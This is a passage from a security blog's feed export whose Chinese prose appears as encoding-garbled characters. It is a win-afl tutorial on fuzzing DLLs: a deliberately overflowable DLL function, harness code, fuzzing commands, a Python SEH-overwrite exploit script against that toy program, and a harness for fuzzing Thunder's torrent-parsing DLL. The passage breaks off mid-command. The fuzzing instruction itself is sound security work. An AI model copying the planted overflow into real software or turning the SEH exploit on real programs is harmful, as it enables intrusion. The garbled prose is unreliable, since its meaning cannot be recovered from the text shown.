*/</span> \</span></span><br><span class="line"><span class="meta">   256,          <span class="comment">/* Overflow unsig 8-bit                    */</span> \</span></span><br><span class="line"><span class="meta">   512,          <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   1000,         <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   1024,         <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   4096,         <span class="comment">/* One-off with common buffer size         */</span> \</span></span><br><span class="line"><span class="meta">   32767         <span class="comment">/* Overflow signed 16-bit when incremented */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INTERESTING_32 \</span></span><br><span class="line"><span class="meta">  -2147483648LL, <span class="comment">/* Overflow signed 32-bit when decremented */</span> \</span></span><br><span class="line"><span class="meta">  -100663046,    <span class="comment">/* Large negative number (endian-agnostic) */</span> \</span></span><br><span class="line"><span class="meta">  -32769,        <span class="comment">/* Overflow signed 16-bit                  */</span> \</span></span><br><span class="line"><span class="meta">   32768,        <span class="comment">/* Overflow signed 16-bit                  */</span> \</span></span><br><span class="line"><span class="meta">   65535,        <span class="comment">/* Overflow unsig 16-bit when incremented  */</span> \</span></span><br><span class="line"><span class="meta">   65536,        <span class="comment">/* Overflow unsig 16 bit                   */</span> \</span></span><br><span class="line"><span class="meta">   100663045,    <span class="comment">/* Large positive number (endian-agnostic) */</span> \</span></span><br><span class="line"><span class="meta">   2147483647    <span class="comment">/* Overflow signed 32-bit when incremented */</span></span></span><br></pre></td></tr></table></figure></li><li><p>dictionaryï¼ŒæŠŠè‡ªåŠ¨ç”Ÿæˆæˆ–ç”¨æˆ·æä¾›çš„tokenæ›¿æ¢/æ’å…¥åˆ°åŸæ–‡ä»¶ä¸­ï¼ˆä»å¤´å¼€å§‹ï¼‰</p><p><code>-x</code>é€‰é¡¹è®¾ç½®çš„token</p></li><li><p>havocï¼Œä¸­æ–‡æ„æ€æ˜¯â€œå¤§ç ´åâ€ï¼Œæ­¤é˜¶æ®µä¼šå¯¹åŸæ–‡ä»¶è¿›è¡Œå¤§é‡å˜å¼‚ï¼Œå…·ä½“è§ä¸‹æ–‡</p><p>å¼€å§‹æ™ºåŠ›ä¸‹é™ï¼Œæˆ‘åœ¨fuzzä¸­çœ‹åˆ°çš„å¤§å¤šæ•°éƒ½æ˜¯è¿™ä¸ªé˜¶æ®µï¼ˆé˜¿å·´é˜¿å·´ï¼‰</p><ul><li>éšæœºé€‰å–æŸä¸ªbitè¿›è¡Œç¿»è½¬</li><li>éšæœºé€‰å–æŸä¸ªbyteï¼Œå°†å…¶è®¾ç½®ä¸ºéšæœºçš„interesting value</li><li>éšæœºé€‰å–æŸä¸ªwordï¼Œå¹¶éšæœºé€‰å–å¤§ã€å°ç«¯åºï¼Œå°†å…¶è®¾ç½®ä¸ºéšæœºçš„interesting value</li><li>éšæœºé€‰å–æŸä¸ªdwordï¼Œå¹¶éšæœºé€‰å–å¤§ã€å°ç«¯åºï¼Œå°†å…¶è®¾ç½®ä¸ºéšæœºçš„interesting value</li><li>éšæœºé€‰å–æŸä¸ªbyteï¼Œå¯¹å…¶å‡å»ä¸€ä¸ªéšæœºæ•°</li><li>éšæœºé€‰å–æŸä¸ªbyteï¼Œå¯¹å…¶åŠ ä¸Šä¸€ä¸ªéšæœºæ•°</li><li>éšæœºé€‰å–æŸä¸ªwordï¼Œå¹¶éšæœºé€‰å–å¤§ã€å°ç«¯åºï¼Œå¯¹å…¶å‡å»ä¸€ä¸ªéšæœºæ•°</li><li>éšæœºé€‰å–æŸä¸ªwordï¼Œå¹¶éšæœºé€‰å–å¤§ã€å°ç«¯åºï¼Œå¯¹å…¶åŠ ä¸Šä¸€ä¸ªéšæœºæ•°</li><li>éšæœºé€‰å–æŸä¸ªdwordï¼Œå¹¶éšæœºé€‰å–å¤§ã€å°ç«¯åºï¼Œå¯¹å…¶å‡å»ä¸€ä¸ªéšæœºæ•°</li><li>éšæœºé€‰å–æŸä¸ªdwordï¼Œå¹¶éšæœºé€‰å–å¤§ã€å°ç«¯åºï¼Œå¯¹å…¶åŠ ä¸Šä¸€ä¸ªéšæœºæ•°</li><li>éšæœºé€‰å–æŸä¸ªbyteï¼Œå°†å…¶è®¾ç½®ä¸ºéšæœºæ•°</li><li>éšæœºåˆ é™¤ä¸€æ®µbytes</li><li>éšæœºé€‰å–ä¸€ä¸ªä½ç½®ï¼Œæ’å…¥ä¸€æ®µéšæœºé•¿åº¦çš„å†…å®¹ï¼Œå…¶ä¸­75%çš„æ¦‚ç‡æ˜¯æ’å…¥åŸæ–‡ä¸­éšæœºä½ç½®çš„å†…å®¹ï¼Œ25%çš„æ¦‚ç‡æ˜¯æ’å…¥ä¸€æ®µéšæœºé€‰å–çš„æ•°</li><li>éšæœºé€‰å–ä¸€ä¸ªä½ç½®ï¼Œæ›¿æ¢ä¸ºä¸€æ®µéšæœºé•¿åº¦çš„å†…å®¹ï¼Œå…¶ä¸­75%çš„æ¦‚ç‡æ˜¯æ›¿æ¢æˆåŸæ–‡ä¸­éšæœºä½ç½®çš„å†…å®¹ï¼Œ25%çš„æ¦‚ç‡æ˜¯æ›¿æ¢æˆä¸€æ®µéšæœºé€‰å–çš„æ•°</li><li>éšæœºé€‰å–ä¸€ä¸ªä½ç½®ï¼Œç”¨éšæœºé€‰å–çš„tokenï¼ˆç”¨æˆ·æä¾›çš„æˆ–è‡ªåŠ¨ç”Ÿæˆçš„ï¼‰æ›¿æ¢</li><li>éšæœºé€‰å–ä¸€ä¸ªä½ç½®ï¼Œç”¨éšæœºé€‰å–çš„tokenï¼ˆç”¨æˆ·æä¾›çš„æˆ–è‡ªåŠ¨ç”Ÿæˆçš„ï¼‰æ’å…¥</li></ul></li><li><p>spliceï¼Œä¸­æ–‡æ„æ€æ˜¯â€œç»æ¥â€ï¼Œæ­¤é˜¶æ®µä¼šå°†ä¸¤ä¸ªæ–‡ä»¶æ‹¼æ¥èµ·æ¥å¾—åˆ°ä¸€ä¸ªæ–°çš„æ–‡ä»¶</p><p>spliceæ˜¯å°†ä¸¤ä¸ªseedæ–‡ä»¶æ‹¼æ¥å¾—åˆ°æ–°çš„æ–‡ä»¶ï¼Œå¹¶å¯¹è¿™ä¸ªæ–°æ–‡ä»¶ç»§ç»­æ‰§è¡Œhavocå˜å¼‚</p></li><li><p>cycleï¼šå¯¹é˜Ÿåˆ—æ‰€æœ‰æ–‡ä»¶å…¨éƒ¨æŒ‰ç…§ä¸Šé¢çš„æ­¥éª¤æ¥ä¸€éå°±ç®—å®Œæˆäº†ä¸€ä¸ªcycleï¼Œæ•´ä¸ªé˜Ÿåˆ—åˆä¼šä»ç¬¬ä¸€ä¸ªæ–‡ä»¶å¼€å§‹ï¼Œå†æ¬¡è¿›è¡Œå˜å¼‚ï¼Œä¸è¿‡ä¸ç¬¬ä¸€æ¬¡å˜å¼‚ä¸åŒçš„æ˜¯ï¼Œè¿™ä¸€æ¬¡å°±ä¸éœ€è¦å†è¿›è¡Œdeterministic fuzzingäº†ã€‚</p></li></ul><h1 id="å‚è€ƒ"><a class="markdownIt-Anchor" href="#å‚è€ƒ"></a> å‚è€ƒ</h1><p><a href="https://paper.seebug.org/496/">https://paper.seebug.org/496/</a></p><p><a href="https://github.com/google/AFL">https://github.com/google/AFL</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å…¶å®è¿˜æ˜¯æŒºç®€å•çš„&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="source" scheme="https://joe1sn.eu.org/tags/source/"/>
    
    <category term="AFL" scheme="https://joe1sn.eu.org/tags/AFL/"/>
    
  </entry>
  
  <entry>
    <title>ã€æ¼æ´æŒ–æ˜ã€‘win-aflä½¿ç”¨æŒ‡åŒ—-ä¸­çº§ç¯‡</title>
    <link href="https://joe1sn.eu.org/2023/07/19/win-afl2/"/>
    <id>https://joe1sn.eu.org/2023/07/19/win-afl2/</id>
    <published>2023-07-19T14:06:52.000Z</published>
    <updated>2023-07-21T03:32:53.355Z</updated>
    
    <content type="html"><![CDATA[<p>ä¸ºä»€ä¹ˆä¸å«é«˜çº§ç¯‡ï¼Œå› ä¸ºé«˜çº§çš„æˆ‘ä¹Ÿä¸ä¼š</p><p>ä¸»è¦è®²ä¸€ä¸‹æ›´è´´è¿‘å®é™…çš„ç”¨æ³•å§</p><p>!!!ä»…å¤§æ ‡é¢˜1å®Œæˆï¼Œå…¨ç‰‡æœªå®Œå¾…ç»­!!!</p><span id="more"></span><h1 id="å¯¹dllè¿›è¡Œfuzz"><a class="markdownIt-Anchor" href="#å¯¹dllè¿›è¡Œfuzz"></a> å¯¹DLLè¿›è¡ŒFuzz</h1><h2 id="ç†è®ºæµ‹è¯•"><a class="markdownIt-Anchor" href="#ç†è®ºæµ‹è¯•"></a> ç†è®ºæµ‹è¯•</h2><p>ä»£ç è¿˜æ˜¯ä¸Šä¸€ç¯‡æåˆ°çš„ä»£ç ï¼Œä¾æ—§æ˜¯32ä½ï¼Œåªä¸è¿‡æº¢å‡ºéƒ¨åˆ†å†™åœ¨DLLé‡Œé¢</p><p><code>dll.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__declspec(dllexport) <span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">char</span> *FileDir)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> password[<span class="number">6</span>] = <span class="string">&quot;ABCDE&quot;</span>;</span><br><span class="line"><span class="type">char</span> str[<span class="number">6</span>];</span><br><span class="line">FILE *fp;</span><br><span class="line"><span class="keyword">if</span>(!(fp=fopen(FileDir,<span class="string">&quot;r&quot;</span>)))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Open Failed\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">fgets(str, <span class="number">0x1000</span>, fp);</span><br><span class="line"></span><br><span class="line">str[<span class="number">5</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(str,password)==<span class="number">0</span>)</span><br><span class="line"><span class="comment">// fprintf(stderr,&quot;OK.\n&quot;);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OK.\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="comment">// fprintf(stderr,&quot;NO.\n&quot;);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NO.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -o mydll.dll dll.c</span><br></pre></td></tr></table></figure><p><code>main.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__declspec(dllimport) <span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: ./HelloWorld.exe FileName\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">vuln(argv[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o main main.c mydll.dll</span><br></pre></td></tr></table></figure><p>ä¸æƒ³è”åˆç¼–è¯‘çš„è¯ä¹Ÿå¯ä»¥ä½¿ç”¨<code>GetProAddress</code>æ¥ç¼–å†™å¦‚ä¸‹harness</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">DWORD</span><span class="params">(__cdecl *pvuln)</span><span class="params">(<span class="type">char</span>* aFileName)</span>;</span><br><span class="line">pvuln vuln = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> mydll_path[] = <span class="string">&quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\dll\\mydll.dll&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: ./HelloWorld.exe FileName\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> HMODULE hMyDLL = <span class="literal">NULL</span>;</span><br><span class="line">hMyDLL = LoadLibraryA(mydll_path);</span><br><span class="line"><span class="keyword">if</span>(hMyDLL == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Load DLL Failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> END;</span><br><span class="line">&#125;</span><br><span class="line">vuln = (pvuln)GetProcAddress(hMyDLL,<span class="string">&quot;vuln&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(vuln == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Get Process Address Failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> END;</span><br><span class="line">&#125;</span><br><span class="line">vuln(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">END:</span><br><span class="line"><span class="keyword">if</span>(hMyDLL)&#123;</span><br><span class="line">FreeLibrary(hMyDLL);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¼€å§‹æ’æ¡©çœ‹çœ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32\drrun.exe ^</span><br><span class="line">-c D:\HackTools\Fuzz\__FuzzWork\winafl\build_Win32\bin\Release\winafl.dll -debug ^</span><br><span class="line">-debug ^</span><br><span class="line">-coverage_module mydll.dll ^</span><br><span class="line">-target_module main.exe ^</span><br><span class="line">-target_offset 0x16B0 ^</span><br><span class="line">-fuzz_iterations 10 -nargs 2 -- ^</span><br><span class="line">main.exe .\in\password.txt</span><br></pre></td></tr></table></figure><p>å¼€å§‹fuzz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe ^</span><br><span class="line">-i .\in ^</span><br><span class="line">-o .\out ^</span><br><span class="line">-D &quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32&quot; ^</span><br><span class="line">-I 100000+ -t 90000+ -- ^</span><br><span class="line">-coverage_module mydll.dll ^</span><br><span class="line">-target_module main.exe ^</span><br><span class="line">-target_offset 0x16B0 ^</span><br><span class="line">-fuzz_iterations 5000 -nargs 2 -- ^</span><br><span class="line">main.exe @@</span><br></pre></td></tr></table></figure><p>ç¬é—´æ‰¾åˆ°crash</p><p><img src="https://img.joe1sn.top/uploads/big/daaf8adb1d017be8d9a2cfe663b3e31e.png" alt="image-20230719223344759" /></p><p>æ ·æœ¬é•¿è¿™æ ·</p><p><img src="https://img.joe1sn.top/uploads/big/54e297bf0dc0db9abedc7f7a9dde0eb7.png" alt="image-20230719223644693" /></p><p>è¿™æ¬¡å°è¯•ä½¿ç”¨x32dbgåˆ†æ</p><p><img src="https://img.joe1sn.top/uploads/big/d7671aece307bb7bea07693d3ee10c34.png" alt="image-20230719223859881" /></p><p>å¾—åˆ°EXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&quot;A&quot;</span>*(<span class="number">0x12c</span>-<span class="built_in">len</span>(shellcode)-<span class="number">32</span>) <span class="comment">#0x1c</span></span><br><span class="line">NSEH = <span class="string">b&quot;\xeb\x06\x90\x90&quot;</span>      <span class="comment">#asm(&quot;jmp 6;nop;nop&quot;)</span></span><br><span class="line">gadget = <span class="string">b&quot;\xEA\x23\x40\x00&quot;</span>    <span class="comment">#004023EA</span></span><br><span class="line">self_gadget = <span class="string">b&quot;\x89\xE0\x05\x24\x06\x00\x00\xFF\xE0&quot;</span><span class="comment"># mov eax, esp</span></span><br><span class="line">                                                        <span class="comment"># sub eax, 0x608</span></span><br><span class="line">                                                        <span class="comment"># jmp eax</span></span><br><span class="line">payload = <span class="string">b&quot;\xaa&quot;</span>*<span class="number">32</span>+shellcode+offset+NSEH+gadget+self_gadget</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/2b31205d967b4cbe010d72e2fa611249.png" alt="image-20230719224736838" /></p><p>è¦ç‚¹å°±æ˜¯ï¼š<strong>Fuzzçš„æ—¶å€™å’Œæ’æ¡©çš„æ—¶å€™åŠ ä¸Š<code>-coverage_module &lt;ä½ çš„dll&gt;</code></strong></p><h2 id="å®é™…æµ‹è¯•"><a class="markdownIt-Anchor" href="#å®é™…æµ‹è¯•"></a> å®é™…æµ‹è¯•</h2><p>ä½ å·²ç»å­¦ä¼šäº†1+1=2ï¼Œè¯·è¯æ˜è´¹é©¬å¤§å®šç†å§ï¼Œä¸ºäº†ç»Ÿä¸€å’Œæ–¹ä¾¿ï¼Œè¿™é‡Œä¹Ÿç”¨çœ‹é›ªé‡Œé¢çš„ä¸€ç¯‡æ–‡ç« </p><p><a href="https://bbs.kanxue.com/thread-265958.htm">ä½¿ç”¨winaflå¯¹è¿…é›·çš„torrentè§£æé€»è¾‘è¿›è¡Œfuzz </a></p><p>é¦–å…ˆæ˜¯æ‰¾åˆ°åˆé€‚çš„è½¯ä»¶ï¼Œç„¶åçŸ¥é“ä»–é‚£ä¸ªåŠŸèƒ½æ˜¯åœ¨é‚£ä¸ªdllä¸­çš„ï¼Œä½ å¯ä»¥ä½¿ç”¨<code>ProcessMonitor</code>æŸ¥çœ‹ï¼ˆä¿—ç§°<code>procmon</code>ï¼‰ï¼Œæˆªå›¾æ²¡æœ‰ï¼Œç‰¹å¾å°±æ˜¯å½“ä½ æ‰“å¼€ä¸€ä¸ª<code>.torrent</code>æ–‡ä»¶åï¼Œ<code>thunder.exe</code>ä¼šé©¬ä¸ŠåŠ è½½<code>AssisstantTools.dll</code>ã€‚é€šè¿‡æŸ¥çœ‹å¯¼å‡ºè¡¨å¯ä»¥æ‰¾åˆ°ä¸€äº›å¯ä»¥æµ‹è¯•çš„å‡½æ•°ï¼Œè¿™é‡Œæˆ‘æµ‹è¯•çš„æ˜¯<code>XL_ParseTorrentFile</code></p><img src="https://img.joe1sn.top/uploads/big/445b9aecbc3b84a5f61ac18ff7ca2b78.png" alt="image-20230721110915736" style="zoom:50%;" /><p>æŸ¥çœ‹å¯¼å…¥è¡¨å¯ä»¥çœ‹åˆ°ä¾èµ–çš„<code>P2PBase.dll</code></p><img src="https://img.joe1sn.top/uploads/big/ee4fca4ffb70d73f4b43d937125d366a.png" alt="image-20230721111002412" style="zoom:50%;" /><p>æ‰€ä»¥fuzzçš„æ—¶å€™ä¹Ÿè¦åŠ ä¸Šï¼Œå¼€å§‹ç¼–å†™harnessï¼Œä½ å¯ä»¥ç”¨é‚£ç¯‡æ–‡ç« é‡Œé¢çš„ï¼Œä½†æ˜¯æˆ‘è¿™é‡Œå°±å¾ˆæ…¢ï¼Œ<br />åŸæ–‡æ–‡ç« ä¸­çš„harnessç”±äº<code>using</code>é™„è¿‘çš„ä»£ç åªåœ¨<code>c++11</code>ä¸­æ”¯æŒï¼Œæ‰€ä»¥ä½¿ç”¨gccç¼–è¯‘æŠ¥é”™çš„å¯ä»¥å°è¯•åŠ ä¸Š<code>-std=c++11</code><br />å¦‚æœä½ ä½¿ç”¨çš„æ˜¯ä¸‹é¢æˆ‘ç¼–å†™çš„harnessï¼Œé‚£ä¹ˆç›´æ¥ç¼–è¯‘å°±å¯ä»¥äº†</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(__cdecl *pXL_ParseTorrentFile)</span><span class="params">(CHAR* aFileName, PVOID* a1)</span></span>;</span><br><span class="line">pXL_ParseTorrentFile XL_ParseTorrentFile = <span class="literal">NULL</span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(__cdecl *pXL_ReleaseTorrentFileInfo)</span><span class="params">(PVOID a1)</span></span>;</span><br><span class="line">pXL_ReleaseTorrentFileInfo XL_ReleaseTorrentFileInfo = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">fuzz_method</span><span class="params">(<span class="type">char</span> *FilePath)</span></span>&#123;</span><br><span class="line">    PVOID a1 = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">XL_ParseTorrentFile</span>(FilePath, &amp;a1);</span><br><span class="line">    <span class="keyword">if</span> (a1)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">XL_ReleaseTorrentFileInfo</span>(a1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//char AssisstantToolsPath[] = &quot;D:\\HackTools\\Fuzz\\WinAFLFuzz\\testcase\\thunder_fuzzer\\a.dll&quot;;</span></span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: ./HelloWorld.exe FileName\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> HMODULE hMyDLL = <span class="literal">NULL</span>;</span><br><span class="line">hMyDLL = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;AssistantTools.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(hMyDLL == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Load DLL Failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> END;</span><br><span class="line">&#125;</span><br><span class="line">XL_ParseTorrentFile = (pXL_ParseTorrentFile)<span class="built_in">GetProcAddress</span>(hMyDLL, <span class="string">&quot;XL_ParseTorrentFile&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(XL_ParseTorrentFile == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Get Process Address Failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> END;</span><br><span class="line">&#125;</span><br><span class="line">XL_ReleaseTorrentFileInfo = (pXL_ReleaseTorrentFileInfo)<span class="built_in">GetProcAddress</span>(hMyDLL, <span class="string">&quot;XL_ReleaseTorrentFileInfo&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(XL_ReleaseTorrentFileInfo == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Get Process Address Failed\n&quot;</span>);</span><br><span class="line"><span class="keyword">goto</span> END;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fuzz_method</span>(argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">END:</span><br><span class="line"><span class="keyword">if</span>(hMyDLL)&#123;</span><br><span class="line"><span class="built_in">FreeLibrary</span>(hMyDLL);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Done\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½ å¯ä»¥ç”¨<code>drrun -t drcov --</code>æ¥æµ‹è¯•çœ‹æ˜¯ä¸æ˜¯ä½¿ç”¨æˆåŠŸï¼Œä¹‹åä½¿ç”¨<code>drrun</code>æµ‹è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32\drrun.exe&quot; ^</span><br><span class="line">-c winafl.dll -debug ^</span><br><span 